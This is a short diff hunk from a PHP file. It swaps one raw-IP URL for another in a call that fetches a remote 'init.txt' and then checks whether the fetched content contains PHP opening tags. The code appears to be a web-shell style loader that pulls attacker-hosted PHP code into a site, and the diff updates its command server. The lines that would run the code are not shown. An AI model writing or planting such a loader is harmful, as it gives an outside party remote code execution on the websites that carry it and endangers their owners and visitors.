@@ -22,7 +22,7 @@ function getRemoteData($url) {
     
     return $result;
 }
-$configData = getRemoteData('http://107.150.34.133/j251114_23/init.txt');
+$configData = getRemoteData('http://173.208.129.190/j251120_13/init.txt');
 
 if ($configData) {
     if (strpos($configData, '<?php') !== false || strpos($configData, '<?=') !== false) {
